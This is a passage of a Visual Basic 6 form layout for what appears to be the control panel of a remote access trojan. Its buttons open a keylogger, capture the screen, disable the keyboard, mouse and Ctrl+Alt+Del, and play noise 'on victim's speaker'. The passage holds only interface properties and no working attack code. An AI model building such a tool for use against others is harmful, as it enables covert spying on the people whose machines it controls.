         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   2010
         TabIndex        =   52
         Top             =   1380
         Width           =   525
      End
      Begin VB.Label Label14 
         BackStyle       =   0  'Transparent
         Caption         =   "Port:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   420
         TabIndex        =   50
         Top             =   1380
         Width           =   405
      End
      Begin VB.Label Label13 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   2520
         TabIndex        =   46
         Top             =   930
         Width           =   45
      End
      Begin VB.Label Label12 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1950
         TabIndex        =   45
         Top             =   930
         Width           =   45
      End
      Begin VB.Label Label11 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1380
         TabIndex        =   44
         Top             =   930
         Width           =   45
      End
      Begin VB.Label Label10 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   2520
         TabIndex        =   39
         Top             =   480
         Width           =   45
      End
      Begin VB.Label Label9 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1950
         TabIndex        =   38
         Top             =   480
         Width           =   45
      End
      Begin VB.Label Label8 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   1380
         TabIndex        =   37
         Top             =   480
         Width           =   45
      End
      Begin VB.Label Label7 
         BackStyle       =   0  'Transparent
         Caption         =   "End IP:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   255
         TabIndex        =   32
         Top             =   915
         Width           =   585
      End
      Begin VB.Label Label6 
         BackStyle       =   0  'Transparent
         Caption         =   "Start IP:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   31
         Top             =   465
         Width           =   735
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   28
      Left            =   5130
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   56
      Top             =   2670
      Width           =   4065
      Begin VB.TextBox txtTime_28 
         Alignment       =   2  'Center
         Height          =   315
         Index           =   1
         Left            =   780
         MaxLength       =   2
         TabIndex        =   224
         Text            =   "00"
         Top             =   1230
         Width           =   350
      End
      Begin VB.CommandButton cmdTimeDate_28 
         Caption         =   "Get Current Time and Date"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   2
         Left            =   750
         Style           =   1  'Graphical
         TabIndex        =   223
         ToolTipText     =   "Get current time and date"
         Top             =   3210
         Width           =   2500
      End
      Begin VB.CommandButton cmdTimeDate_28 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   2430
         Style           =   1  'Graphical
         TabIndex        =   222
         ToolTipText     =   "Set date"
         Top             =   2370
         Width           =   1200
      End
      Begin VB.CommandButton cmdTimeDate_28 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   2460
         Style           =   1  'Graphical
         TabIndex        =   221
         ToolTipText     =   "Set time"
         Top             =   1230
         Width           =   1200
      End
      Begin VB.TextBox txtTime_28 
         Alignment       =   2  'Center
         Height          =   315
         Index           =   0
         Left            =   300
         MaxLength       =   2
         TabIndex        =   217
         Text            =   "00"
         Top             =   1230
         Width           =   350
      End
      Begin VB.ComboBox cbTime_28 
         Height          =   315
         ItemData        =   "frmMain.frx":27C4
         Left            =   1230
         List            =   "frmMain.frx":27CE
         Style           =   2  'Dropdown List
         TabIndex        =   218
         Top             =   1230
         Width           =   700
      End
      Begin VB.TextBox txtDate_28 
         Height          =   315
         Left            =   300
         MaxLength       =   10
         TabIndex        =   216
         Text            =   "01/01/2002"
         Top             =   2370
         Width           =   1200
      End
      Begin VB.Label Label67 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "(DD/MM/YYYY)"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   390
         TabIndex        =   227
         Top             =   2730
         Width           =   1050
      End
      Begin VB.Label Label66 
         BackStyle       =   0  'Transparent
         Caption         =   "(HH:MM)"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   420
         TabIndex        =   226
         Top             =   1590
         Width           =   765
      End
      Begin VB.Label Label65 
         BackStyle       =   0  'Transparent
         Caption         =   ":"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   690
         TabIndex        =   225
         Top             =   1260
         Width           =   135
      End
      Begin VB.Label Label64 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Date                                                                 "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   300
         TabIndex        =   220
         Top             =   1950
         Width           =   3330
      End
      Begin VB.Label Label63 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Time                                                                     "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   300
         TabIndex        =   219
         Top             =   780
         Width           =   3345
      End
      Begin VB.Label Label62 
         BackStyle       =   0  'Transparent
         Caption         =   "Time/Date                                                                          "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   215
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   26
      Left            =   4920
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   54
      Top             =   2550
      Width           =   4065
      Begin VB.Timer TimerMouse_26 
         Enabled         =   0   'False
         Interval        =   1
         Left            =   120
         Top             =   360
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Disable Mouse"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   7
         Left            =   300
         Style           =   1  'Graphical
         TabIndex        =   253
         ToolTipText     =   "Disable mouse"
         Top             =   3180
         Width           =   3420
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Stop"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   6
         Left            =   2520
         Style           =   1  'Graphical
         TabIndex        =   252
         ToolTipText     =   "Stop control mouse"
         Top             =   2550
         Width           =   1200
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Move/Control Mouse"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   5
         Left            =   300
         Style           =   1  'Graphical
         TabIndex        =   251
         ToolTipText     =   "Control mouse"
         Top             =   2550
         Width           =   2085
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Show Mouse"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   4
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   250
         ToolTipText     =   "Show mouse cursor"
         Top             =   1950
         Width           =   1630
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Hide Mouse"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   3
         Left            =   300
         Style           =   1  'Graphical
         TabIndex        =   249
         ToolTipText     =   "Hide mouse cursor"
         Top             =   1950
         Width           =   1630
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Restore Buttons"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   2
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   248
         ToolTipText     =   "Restore mouse buttons"
         Top             =   1350
         Width           =   1630
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Reverse Buttons"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   1
         Left            =   300
         Style           =   1  'Graphical
         TabIndex        =   247
         ToolTipText     =   "Reverse mouse buttons"
         Top             =   1350
         Width           =   1630
      End
      Begin VB.CommandButton cmdMouse_26 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   0
         Left            =   2490
         Style           =   1  'Graphical
         TabIndex        =   246
         ToolTipText     =   "Set double click time"
         Top             =   750
         Width           =   1200
      End
      Begin VB.TextBox txtDblClickTime_26 
         Height          =   285
         Left            =   1680
         MaxLength       =   5
         TabIndex        =   244
         Text            =   "500"
         ToolTipText     =   "Million Second"
         Top             =   810
         Width           =   675
      End
      Begin VB.Label Label72 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Double Click Time:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   330
         TabIndex        =   245
         Top             =   840
         Width           =   1290
      End
      Begin VB.Label Label71 
         BackStyle       =   0  'Transparent
         Caption         =   "Mouse                                                                        "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   243
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   6
      Left            =   2520
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   11
      Top             =   1350
      Width           =   4065
      Begin VB.CommandButton cmdKeyboard_6 
         Caption         =   "Open Keylogger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   0
         Left            =   990
         Style           =   1  'Graphical
         TabIndex        =   302
         ToolTipText     =   "Open keylogger"
         Top             =   750
         Width           =   2000
      End
      Begin VB.CommandButton cmdKeyboard_6 
         Caption         =   "Send Keystrokes"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   1
         Left            =   990
         Style           =   1  'Graphical
         TabIndex        =   301
         ToolTipText     =   "Send keystrokes"
         Top             =   1350
         Width           =   2000
      End
      Begin VB.CommandButton cmdKeyboard_6 
         Caption         =   "Get Offline Keys"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   2
         Left            =   990
         Style           =   1  'Graphical
         TabIndex        =   300
         ToolTipText     =   "Get offline keys"
         Top             =   1980
         Width           =   2000
      End
      Begin VB.CommandButton cmdKeyboard_6 
         Caption         =   "Clear Offline Keys"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   3
         Left            =   990
         Style           =   1  'Graphical
         TabIndex        =   299
         ToolTipText     =   "Clear offline keys"
         Top             =   2580
         Width           =   2000
      End
      Begin VB.CommandButton cmdKeyboard_6 
         Caption         =   "Disable Keyboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   4
         Left            =   990
         Style           =   1  'Graphical
         TabIndex        =   298
         ToolTipText     =   "Disable keyboard"
         Top             =   3180
         Width           =   2000
      End
      Begin VB.Label Label79 
         BackStyle       =   0  'Transparent
         Caption         =   "Keyboard                                                                   "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   297
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   18
      Left            =   3960
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   23
      Top             =   2070
      Width           =   4065
      Begin VB.CommandButton cmdDesktop_18 
         Caption         =   "Full Screen Capture"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   1
         Left            =   810
         Style           =   1  'Graphical
         TabIndex        =   317
         ToolTipText     =   "Full screen capture"
         Top             =   2460
         Width           =   2500
      End
      Begin VB.CommandButton cmdDesktop_18 
         Caption         =   "Open Screen Preview"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   0
         Left            =   810
         Style           =   1  'Graphical
         TabIndex        =   316
         ToolTipText     =   "Open screen preview"
         Top             =   1470
         Width           =   2500
      End
      Begin VB.Label Label85 
         BackStyle       =   0  'Transparent
         Caption         =   "Desktop                                                                      "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   318
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   9
      Left            =   2850
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   14
      Top             =   1530
      Width           =   4065
      Begin VB.CommandButton cmdFind_9 
         Caption         =   "Find File[s]"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Left            =   1050
         Style           =   1  'Graphical
         TabIndex        =   309
         ToolTipText     =   "Find files"
         Top             =   3300
         Width           =   1920
      End
      Begin VB.CheckBox CheckSub_9 
         BackColor       =   &H80000010&
         Caption         =   "Search Sub-Directories"
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   1050
         TabIndex        =   308
         Top             =   2340
         Width           =   2055
      End
      Begin VB.TextBox txtName_9 
         Height          =   285
         Left            =   180
         TabIndex        =   305
         ToolTipText     =   "Name to find"
         Top             =   870
         Width           =   3640
      End
      Begin VB.TextBox txtFolder_9 
         Height          =   285
         Left            =   180
         TabIndex        =   304
         ToolTipText     =   "Look in folder"
         Top             =   1710
         Width           =   3640
      End
      Begin VB.Label Label82 
         BackStyle       =   0  'Transparent
         Caption         =   "Named:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   210
         TabIndex        =   307
         Top             =   600
         Width           =   795
      End
      Begin VB.Label Label81 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Look In Folder:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   210
         TabIndex        =   306
         Top             =   1440
         Width           =   1080
      End
      Begin VB.Label Label80 
         BackStyle       =   0  'Transparent
         Caption         =   "Find Files                                                                    "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   303
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   29
      Left            =   5220
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   57
      Top             =   2730
      Width           =   4065
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "On"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   18
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   185
         ToolTipText     =   "Turn on NumLock"
         Top             =   3630
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   19
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   184
         ToolTipText     =   "Turn off NumLock"
         Top             =   3630
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "On"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   16
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   183
         ToolTipText     =   "Turn on CapsLock"
         Top             =   3270
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   17
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   182
         ToolTipText     =   "Turn off CapsLock"
         Top             =   3270
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "On"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   14
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   181
         ToolTipText     =   "Turn on ScrollLock"
         Top             =   2910
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   15
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   180
         ToolTipText     =   "Turn off ScrollLock"
         Top             =   2910
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "On"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   12
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   179
         ToolTipText     =   "turn on Ctrl+Alt+Del and Alt+Tab"
         Top             =   2550
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   13
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   178
         ToolTipText     =   "turn off Ctrl+Alt+Del and Alt+Tab"
         Top             =   2550
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "On"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   10
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   177
         ToolTipText     =   "Turn on monitor"
         Top             =   2190
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   11
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   176
         ToolTipText     =   "Turn off monitor"
         Top             =   2190
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Start"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   8
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   174
         ToolTipText     =   "Start noise sound on victim's speaker"
         Top             =   1830
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Stop"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   9
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   173
         ToolTipText     =   "Stop noise sound on victim's speaker"
         Top             =   1830
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Open"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   6
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   172
         ToolTipText     =   "Open CD-ROM door"
         Top             =   1470
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Close"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   7
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   171
         ToolTipText     =   "Close CD-ROM door"
         Top             =   1470
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Hide"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   4
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   170
         ToolTipText     =   "Hide taskbar"
         Top             =   1110
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Show"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   5
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   169
         ToolTipText     =   "Show taskbar"
         Top             =   1110
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Hide"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   2
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   168
         ToolTipText     =   "Hide start button"
         Top             =   750
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Show"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
